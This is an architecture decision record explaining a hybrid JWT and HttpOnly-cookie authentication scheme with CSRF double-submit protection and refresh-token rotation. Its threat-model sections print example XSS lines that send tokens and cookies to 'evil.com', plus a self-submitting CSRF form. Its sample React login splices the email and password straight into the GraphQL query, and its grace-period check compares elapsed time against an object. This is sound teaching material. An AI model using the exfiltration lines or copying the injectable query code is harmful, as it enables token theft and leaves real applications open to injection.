# ADR-005: Authentication Token Strategy and CSRF Protection

## Status
Implemented

## Context

This ADR documents the authentication token storage strategy, CSRF protection, and threat model for the application. It explains **why** we use a hybrid JWT + HttpOnly cookie approach rather than pure JWT or pure cookie-based sessions.

**If you're new to this codebase, read this entire document.** It will save you hours of confusion about why things are designed this way.

---

## The Common Misconception

You'll often hear "JWT vs Cookies" presented as two competing approaches:

| Approach | Description |
|----------|-------------|
| JWT | Stateless tokens in Authorization header |
| Cookies | Server-side sessions with session ID in cookie |

**This is a false dichotomy.** We use BOTH:
- **JWT access token** in Authorization header (short-lived, stateless)
- **Refresh token** in HttpOnly cookie (long-lived, secure storage)

To understand why, you need to understand the threat model.

---

## Part 1: Threat Model

### 1.1 The Tokens We Need to Protect

| Token | Lifetime | Purpose | If Stolen |
|-------|----------|---------|-----------|
| Access Token (JWT) | 15 minutes | Authorize API requests | Attacker has 15 min of access |
| Refresh Token | 7 days | Get new access tokens | Attacker has 7 days of access |

The refresh token is the **crown jewel**. Protecting it is the priority.

### 1.2 Attack Vectors

#### XSS (Cross-Site Scripting)
Attacker injects malicious JavaScript into your site.

```javascript
// Attacker's script running ON yourapp.com
// (injected via comment field, URL param, etc.)
fetch('https://evil.com/steal?token=' + localStorage.getItem('token'));
```

**Impact**: Can steal anything JavaScript can access.

#### CSRF (Cross-Site Request Forgery)
Attacker tricks user's browser into making requests to your site.

```html
<!-- On evil.com -->
<form action="https://yourapp.com/api/transfer" method="POST">
  <input name="amount" value="10000">
  <input name="to" value="attacker">
</form>
<script>document.forms[0].submit();</script>
```

**Impact**: Can perform actions as the user (if using cookie auth).

---

## Part 2: The Token Storage Problem

When your React app receives tokens, where can it store them?

### Option A: localStorage

```javascript
localStorage.setItem('accessToken', token);
localStorage.setItem('refreshToken', token);
```

| Pros | Cons |
|------|------|
| Persists across page refresh | **Vulnerable to XSS** |
| Easy to implement | Any JS can read it |

**Fatal flaw**: XSS attack steals your 7-day refresh token.

### Option B: JavaScript Memory

```javascript
let accessToken = response.accessToken;
```

| Pros | Cons |
|------|------|
| Safe from XSS (sort of) | **Lost on page refresh** |
| | User logged out constantly |

**Fatal flaw**: Terrible UX.

### Option C: HttpOnly Cookie

```
Set-Cookie: refresh_token=xyz; HttpOnly; Secure; SameSite=Strict
```

| Pros | Cons |
|------|------|
| **JavaScript cannot read it** | Vulnerable to CSRF |
| Persists across refresh | Sent automatically with requests |
| XSS cannot steal it | |

**This is the answer** for the refresh token, but we need to handle CSRF.

---

## Part 3: Understanding Same-Origin Policy vs HttpOnly

These are **two different protections** that people often confuse.

### Same-Origin Policy (Browser Security Rule)

JavaScript can only read cookies **for its own domain**.

```
┌────────────────────────────────────────────────────────────┐
│                    User's Browser                           │
│                                                             │
│   yourapp.com cookies        evil.com cookies               │
│   ┌─────────────────┐        ┌─────────────────┐           │
│   │ csrf=abc123     │        │ (empty)         │           │
│   │ refresh=xyz     │        │                 │           │
│   └─────────────────┘        └─────────────────┘           │
│          ▲                          ▲                       │
│          │                          │                       │
│   JS on yourapp.com          JS on evil.com                │
│   CAN read these             can ONLY read these           │
└────────────────────────────────────────────────────────────┘
```

**Key insight**: evil.com's JavaScript CANNOT read yourapp.com's cookies, even non-HttpOnly ones.

### HttpOnly Flag (Extra Protection)

```
Set-Cookie: refresh_token=xyz; HttpOnly
```

With HttpOnly, **NO JavaScript can read the cookie** - not even your own app's JavaScript.

| Cookie | Your App's JS | XSS Script (on your domain) | evil.com JS |
|--------|---------------|----------------------------|-------------|
| Non-HttpOnly | Can read | Can read | Cannot read |
| HttpOnly | Cannot read | **Cannot read** | Cannot read |

### Why This Matters

Without HttpOnly, XSS can steal your refresh token:

```javascript
// XSS script injected INTO yourapp.com
const refreshToken = document.cookie.match(/refresh_token=([^;]+)/)[1];
fetch('https://evil.com/steal?token=' + refreshToken);  // STOLEN!
```

With HttpOnly, XSS **cannot** steal it:

```javascript
// XSS script injected INTO yourapp.com
document.cookie;  // refresh_token NOT visible here
// Attacker cannot exfiltrate the token
```

---

## Part 4: The CSRF Problem

### Why Cookies Create CSRF Vulnerability

Cookies are sent **automatically** with every request to their domain:

```javascript
// On evil.com
fetch('https://yourapp.com/api/refresh', {
  method: 'POST',
  credentials: 'include'  // Browser attaches yourapp.com's cookies
});
```

The browser attaches the `refresh_token` cookie even though the request came from evil.com.

### The Double-Submit Cookie Pattern

Our solution:

```
Server sets TWO cookies on login:
1. refresh_token (HttpOnly) - JS cannot read
2. csrf (NOT HttpOnly) - JS CAN read

For refresh requests, client must send:
1. Cookies (automatic) - includes both
2. X-CSRF-Token header (manual) - JS reads csrf cookie, adds to header

Server validates:
- csrf cookie value === X-CSRF-Token header value
```

### Why This Stops CSRF

```javascript
// Attacker on evil.com tries:
fetch('https://yourapp.com/graphql', {
  credentials: 'include',  // Browser sends cookies
  headers: {
    'X-CSRF-Token': '???'  // What value? Attacker doesn't know!
  }
});
```

The attacker CANNOT read yourapp.com's csrf cookie (Same-Origin Policy), so they cannot set the correct header value.

```
Legitimate request from yourapp.com:
  Cookie: csrf=abc123; refresh_token=xyz
  X-CSRF-Token: abc123  ← JS read the cookie
  Server: abc123 === abc123? ✓ ALLOW

CSRF attack from evil.com:
  Cookie: csrf=abc123; refresh_token=xyz  ← Browser sends automatically
  X-CSRF-Token: ???  ← Attacker guesses
  Server: abc123 === ???  ✗ DENY
```

### Why csrf Cookie is NOT HttpOnly

The csrf cookie must be readable by JavaScript so your app can:
1. Read the cookie value
2. Put it in the X-CSRF-Token header

If it were HttpOnly, your own app couldn't read it either!

---

## Part 5: Token Rotation and Reuse Detection

### The Problem: Silent Token Theft

Without rotation, a stolen refresh token can be used indefinitely:

```
Day 1: Attacker steals refresh_token "ABC"
Day 2: Attacker uses "ABC" → Gets access token
Day 3: User uses "ABC" → Works fine (user unaware!)
Day 7: Token expires, attacker had week of access
```

### The Solution: Rotate on Every Use

```
User logs in:
  Server creates: refresh_token="ABC", tokenFamily="family_123"

User refreshes:
  Server receives: "ABC"
  Server creates: new refresh_token="DEF"
  Server stores: previousTokenHash=hash("ABC")
  Server returns: "DEF"

  Old token "ABC" is now invalid.
```

### Detecting Theft via Reuse

```
Attacker steals "ABC" before user refreshes

Attacker uses "ABC":
  Server: Valid! Here's "DEF"
  Server: previousTokenHash = hash("ABC")

User tries "ABC":
  Server: "ABC" not found in tokenHash
  Server: Checking previousTokenHash... FOUND!
  Server: "ABC" was already used and rotated!
  Server: ALERT - Token theft detected!
  Server: Revoke ALL tokens in family_123

Both attacker ("DEF") and user ("ABC") are logged out.
User must re-authenticate with password.
```

### Database Schema for Tracking

```prisma
model Session {
  id                String   @id
  userId            String
  tokenHash         String   @unique    // Current valid token (SHA-256)
  tokenFamily       String              // Groups related tokens
  previousTokenHash String?             // The rotated-from token
  expiresAt         DateTime
  lastUsedAt        DateTime            // For grace period calculation
}
```

### Grace Period (Network Failure Handling)

In production, a strict "one use" policy can fail due to network issues:

```
Client sends refresh request
Server rotates token, responds with new token
Network drops response
Client retries with OLD token
Server sees "reuse" - but it's legitimate!
```

Solution: Brief grace period where the old token is still valid:

```typescript
const GRACE_PERIOD = {
  production: 30_000,   // 30 seconds
  staging: 60_000,      // 60 seconds
  development: 120_000, // 2 minutes
};
```

---

## Part 6: Our Hybrid Architecture

### Token Responsibilities

| Token | Storage | Transport | Purpose |
|-------|---------|-----------|---------|
| Access Token (JWT) | JS memory | `Authorization: Bearer` header | Authorize requests |
| Refresh Token | HttpOnly cookie | Automatic | Get new access tokens |
| CSRF Token | Cookie (readable) | `X-CSRF-Token` header | Prevent CSRF |

### Request Flows

#### Normal Authenticated Request
```
POST /graphql
Authorization: Bearer eyJhbG...  ← From JS memory
Content-Type: application/json

{ "query": "{ me { name } }" }
```
- No cookies needed
- No CSRF protection needed (JWT isn't auto-sent)
- Stateless verification (no DB hit)

#### Refresh Token Request
```
POST /graphql
Cookie: refresh_token=xyz; csrf=abc123  ← Auto-sent
X-CSRF-Token: abc123                     ← JS sets this

{ "mutation": "refreshToken" }
```
- CSRF validation required (cookie-based auth)
- Token rotation occurs
- Returns new access token in body
- Sets new refresh token cookie

#### Login/Signup Request
```
POST /graphql
Content-Type: application/json

{ "mutation": "login(email, password)" }
```

Response:
```
Body: { "accessToken": "eyJhbG..." }
Set-Cookie: refresh_token=xyz; HttpOnly; Secure; SameSite=Strict
Set-Cookie: csrf=abc123; Secure; SameSite=Strict
```

### Why JWT for Access Token?

| Benefit | Explanation |
|---------|-------------|
| Stateless | No database hit on every request |
| Cross-domain | Works with multiple API services |
| No CSRF risk | Not auto-sent by browser |
| Self-contained | Contains user ID, expiry, etc. |

### Why Cookie for Refresh Token?

| Benefit | Explanation |
|---------|-------------|
| HttpOnly | Cannot be stolen via XSS |
| Automatic | Browser handles storage/sending |
| Persistent | Survives page refresh |
| SameSite | Additional CSRF protection |

---

## Part 7: The Accepted Blast Radius

### If Attacker Has XSS

With our architecture, XSS **cannot** steal the refresh token. However:

| What They CAN Do | What They CANNOT Do |
|------------------|---------------------|
| Steal access token (15 min) | Steal refresh token |
| Make requests while script runs | Use tokens from their server |
| Read csrf cookie | Access after user closes tab |

**Blast radius**: 15 minutes of access, only while victim is on page.

### Without HttpOnly (What We Avoided)

| What They Could Do |
|--------------------|
| Steal refresh token (7 days!) |
| Use token from attacker's server |
| Persistent access even after user closes tab |
| User has no way to detect or stop it |

**Blast radius**: 7 days of access, from anywhere.

### Security Layers Summary

```
┌─────────────────────────────────────────────────────────────┐
│ Layer 1: SameSite=Strict cookies                            │
│          Blocks most CSRF attacks                           │
├─────────────────────────────────────────────────────────────┤
│ Layer 2: CSRF double-submit token                           │
│          Blocks remaining CSRF attacks                      │
├─────────────────────────────────────────────────────────────┤
│ Layer 3: HttpOnly refresh token                             │
│          Limits XSS blast radius                            │
├─────────────────────────────────────────────────────────────┤
│ Layer 4: Short-lived access token (15 min)                  │
│          Stolen access tokens expire quickly                │
├─────────────────────────────────────────────────────────────┤
│ Layer 5: Token rotation with reuse detection                │
│          Detects and revokes stolen refresh tokens          │
└─────────────────────────────────────────────────────────────┘
```

---

## Part 8: Implementation Details

### Setting Cookies from GraphQL Resolvers

GraphQL resolvers don't have direct access to HTTP response. We use `cookieStore` from `@whatwg-node/server-plugin-cookies`:

```typescript
// In Context type (builder.ts)
export interface Context {
  currentUser: User | null;
  request: RequestWithCookies;  // Has cookieStore
}

// In resolver (auth.ts)
await context.request.cookieStore?.set({
  name: 'refresh_token',
  value: token,
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 7 * 24 * 60 * 60,
});
```

### CSRF Validation

```typescript
// middleware/csrf.ts
export function validateCsrf(request: Request): boolean {
  const cookies = parseCookies(request.headers.get('cookie'));
  const cookieToken = cookies['csrf'];
  const headerToken = request.headers.get('x-csrf-token');

  if (!cookieToken || !headerToken) return false;

  // Timing-safe comparison prevents timing attacks
  return timingSafeEqual(
    Buffer.from(cookieToken),
    Buffer.from(headerToken)
  );
}
```

### Token Reuse Detection

```typescript
// Simplified from auth.ts
async function refreshToken(token: string, context: Context) {
  const tokenHash = sha256(token);

  // Try to find valid session
  let session = await db.session.findUnique({
    where: { tokenHash }
  });

  if (session) {
    // Valid token - rotate it
    const newToken = generateToken();
    await db.session.update({
      where: { id: session.id },
      data: {
        tokenHash: sha256(newToken),
        previousTokenHash: tokenHash,
        lastUsedAt: new Date(),
      }
    });
    return newToken;
  }

  // Check if this was a PREVIOUS token (reuse attempt)
  session = await db.session.findFirst({
    where: { previousTokenHash: tokenHash }
  });

  if (session) {
    const timeSinceRotation = Date.now() - session.lastUsedAt.getTime();

    if (timeSinceRotation < GRACE_PERIOD) {
      // Within grace period - likely network retry
      // Return current valid session data
      return getCurrentToken(session);
    }

    // Outside grace period - genuine reuse attack!
    await db.session.deleteMany({
      where: { tokenFamily: session.tokenFamily }
    });
    throw new Error('Token reuse detected. All sessions revoked.');
  }

  throw new Error('Invalid refresh token');
}
```

---

## Part 9: Client Implementation

### React Auth Flow

```typescript
// AuthContext.tsx
const AuthContext = createContext<AuthContextType>(null);

export function AuthProvider({ children }) {
  const [accessToken, setAccessToken] = useState<string | null>(null);

  // On app load, try to refresh (cookie sent automatically)
  useEffect(() => {
    refreshAccessToken();
  }, []);

  async function refreshAccessToken() {
    // Read CSRF token from cookie
    const csrfToken = document.cookie
      .match(/csrf=([^;]+)/)?.[1];

    const response = await fetch('/graphql', {
      method: 'POST',
      credentials: 'include',  // Send cookies
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken || '',
      },
      body: JSON.stringify({
        query: 'mutation { refreshToken { accessToken } }'
      }),
    });

    const { data } = await response.json();
    if (data?.refreshToken?.accessToken) {
      setAccessToken(data.refreshToken.accessToken);
    }
  }

  async function login(email: string, password: string) {
    const response = await fetch('/graphql', {
      method: 'POST',
      credentials: 'include',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        query: `mutation {
          login(email: "${email}", password: "${password}") {
            accessToken
          }
        }`
      }),
    });

    const { data } = await response.json();
    setAccessToken(data.login.accessToken);
    // Refresh token set as HttpOnly cookie automatically
  }

  async function logout() {
    const csrfToken = document.cookie.match(/csrf=([^;]+)/)?.[1];

    await fetch('/graphql', {
      method: 'POST',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken || '',
      },
      body: JSON.stringify({
        query: 'mutation { logout }'
      }),
    });

    setAccessToken(null);
  }

  // Authenticated fetch helper
  async function authFetch(query: string) {
    return fetch('/graphql', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${accessToken}`,
      },
      body: JSON.stringify({ query }),
    });
  }

  return (
    <AuthContext.Provider value={{
      accessToken,
      login,
      logout,
      authFetch,
      refreshAccessToken
    }}>
      {children}
    </AuthContext.Provider>
  );
}
```

---

## Part 10: Testing CSRF Protection

### Manual Testing

```bash
# 1. Login and get cookies
curl -c cookies.txt -X POST http://localhost:4001/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { login(email:\"test@test.com\", password:\"password123\") { accessToken } }"}'

# 2. Try refresh WITHOUT CSRF header (should fail)
curl -b cookies.txt -X POST http://localhost:4001/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { refreshToken { accessToken } }"}'
# Error: CSRF validation failed

# 3. Try refresh WITH CSRF header (should work)
CSRF=$(grep csrf cookies.txt | awk '{print $7}')
curl -b cookies.txt -X POST http://localhost:4001/graphql \
  -H "Content-Type: application/json" \
  -H "X-CSRF-Token: $CSRF" \
  -d '{"query":"mutation { refreshToken { accessToken } }"}'
# Success: new accessToken returned
```

### Automated E2E Test

```typescript
// security.pentest.e2e.test.ts
it('blocks refresh without CSRF token', async () => {
  // Login to get cookies
  const loginResult = await executeQuery(yoga, loginMutation, {
    headers: { cookie: '' }
  });

  const cookies = extractCookies(loginResult);

  // Try refresh WITHOUT X-CSRF-Token header
  const refreshResult = await executeQuery(yoga, refreshMutation, {
    headers: {
      cookie: cookies,
      // Deliberately omit X-CSRF-Token
    }
  });

  expect(refreshResult.errors).toBeDefined();
  expect(refreshResult.errors[0].message).toContain('CSRF');
});
```

---

## Summary

| Decision | Rationale |
|----------|-----------|
| JWT for access token | Stateless, cross-domain, no CSRF risk |
| HttpOnly cookie for refresh token | Cannot be stolen via XSS |
| CSRF double-submit pattern | Protects cookie-based refresh endpoint |
| Token rotation | Detects theft, limits blast radius |
| 15-minute access token | Limits damage if stolen via XSS |
| Grace period | Handles network failures gracefully |

**The accepted trade-off**: XSS can steal a 15-minute access token. This is unavoidable - if attacker has XSS, they can make requests as the user anyway. But they CANNOT steal the 7-day refresh token, and access ends when the user closes the tab.

---

## References

- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Auth0: Refresh Token Rotation](https://auth0.com/docs/secure/tokens/refresh-tokens/refresh-token-rotation)
- [web.dev: SameSite cookies explained](https://web.dev/samesite-cookies-explained/)
- [OWASP: HttpOnly Flag](https://owasp.org/www-community/HttpOnly)

---

## Changelog

| Date | Change |
|------|--------|
| 2025-01-15 | Initial implementation with CSRF and token rotation |
